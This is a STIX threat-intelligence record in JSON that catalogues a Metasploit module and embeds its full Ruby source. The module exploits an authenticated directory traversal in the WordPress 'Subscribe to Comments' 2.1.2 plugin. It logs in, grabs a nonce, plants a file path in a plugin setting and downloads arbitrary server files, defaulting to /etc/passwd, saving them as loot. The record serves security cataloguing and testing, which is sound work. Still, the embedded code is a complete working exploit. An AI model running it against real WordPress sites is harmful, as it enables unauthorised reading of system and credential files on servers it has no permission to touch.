{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1891a1de-f01f-4cee-8500-26689ea1916b",
    "created": "2024-08-14T16:29:35.639114Z",
    "modified": "2024-08-14T16:29:35.639118Z",
    "name": "WordPress Subscribe Comments File Read Vulnerability",
    "description": " This module exploits an authenticated directory traversal vulnerability in WordPress Plugin \"Subscribe to Comments\" version 2.1.2, allowing to read arbitrary files with the web server privileges.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_subscribe_comments_file_read.rb",
            "external_id": "wp_subscribe_comments_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://advisories.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',\n      'Description'    => %q{\n        This module exploits an authenticated directory traversal vulnerability\n        in WordPress Plugin \"Subscribe to Comments\" version 2.1.2, allowing\n        to read arbitrary files with the web server privileges.\n      },\n      'References'     =>\n        [\n          ['WPVDB', '8102'],\n          ['PACKETSTORM', '132694'],\n          ['URL', 'https://advisories.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']\n        ],\n      'Author'         =>\n        [\n          'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('WP_USER', [true, 'A valid username', nil]),\n        OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])\n      ])\n  end\n\n  def user\n    datastore['WP_USER']\n  end\n\n  def password\n    datastore['WP_PASS']\n  end\n\n  def check\n    check_plugin_version_from_readme('subscribe-to-comments', '2.3')\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'uri'    => normalize_uri(wordpress_url_backend, 'options-general.php'),\n      'method' => 'GET',\n      'vars_get'  => {\n        'page'    => 'stc-options'\n      },\n      'cookie' => cookie\n    )\n\n    if res && res.redirect? && res.redirection\n      location = res.redirection\n      print_status(\"Following redirect to #{location}\")\n      res = send_request_cgi(\n        'uri'    => location,\n        'method' => 'GET',\n        'cookie' => cookie\n      )\n    end\n\n    if res && res.body && res.body =~ /id=\"_wpnonce\" name=\"_wpnonce\" value=\"([a-z0-9]+)\" /\n      return Regexp.last_match[1]\n    end\n    nil\n  end\n\n  def down_file(cookie, nonce)\n    filename = datastore['FILEPATH']\n    filename = filename[1, filename.length] if filename =~ %r{/^///}\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(wordpress_url_backend, 'options-general.php'),\n      'vars_get'  => {\n        'page'    => 'stc-options'\n      },\n      'vars_post' => {\n        'sg_subscribe_settings[name]' => '',\n        'sg_subscribe_settings[email]' => '',\n        'sg_subscribe_settings[clear_both]' => 'clear_both',\n        'sg_subscribe_settings[not_subscribed_text]' => 'teste',\n        'sg_subscribe_settings[subscribed_text]' => 'teste',\n        'sg_subscribe_settings[author_text]' => '',\n        'sg_subscribe_settings[use_custom_style]' => 'use_custom_style',\n        'sg_subscribe_settings[header]' => \"#{filename}\",\n        'sg_subscribe_settings[sidebar]' => '',\n        'sg_subscribe_settings[footer]' => '',\n        'sg_subscribe_settings[before_manager]' => '',\n        'sg_subscribe_settings[after_manager]' => '',\n        'sg_subscribe_settings_submit' => 'Update Options',\n        '_wpnonce' => \"#{nonce}\",\n        '_wp_http_referer' => '/wp-admin/options-general.php?page=stc-options'\n      },\n      'cookie'    => cookie\n    )\n\n    if res && res.code == 200 && res.body.include?(\"<p><strong>Options saved.</strong>\")\n      return res.body\n    end\n    nil\n  end\n\n  def run_host(ip)\n    vprint_status(\"Trying to login as: #{user}\")\n    cookie = wordpress_login(user, password)\n    if cookie.nil?\n      print_error(\"Unable to login as: #{user}\")\n      return\n    end\n    store_valid_credential(user: user, private: password, proof: cookie)\n\n    vprint_status(\"Trying to get nonce...\")\n    nonce = get_nonce(cookie)\n    if nonce.nil?\n      print_error(\"Can not get nonce after login\")\n      return\n    end\n    vprint_status(\"Got nonce: #{nonce}\")\n\n    vprint_status(\"Trying to download filepath.\")\n    file_path = down_file(cookie, nonce)\n    if file_path.nil?\n      print_error(\"Error downloading filepath.\")\n      return\n    end\n\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => normalize_uri(target_uri.path),\n      'vars_get'  => {\n        'wp-subscription-manager' => '1'\n      },\n      'cookie'    => cookie\n    )\n\n    if res && res.code == 200 &&\n        res.body.length > 830 &&\n        res.body.include?(\">Find Subscriptions</\") &&\n        res.headers['Content-Length'].to_i > 830\n\n      res_clean = res.body.gsub(/\\t/, '').gsub(/\\r\\n/, '').gsub(/<.*$/, \"\")\n\n      vprint_line(\"\\n#{res_clean}\")\n      fname = datastore['FILEPATH']\n      path = store_loot(\n        'subscribecomments.traversal',\n        'text/plain',\n        ip,\n        res_clean,\n        fname\n      )\n\n      print_good(\"File saved in: #{path}\")\n    else\n      print_error(\"Nothing was downloaded. You can try to change the FILEPATH.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}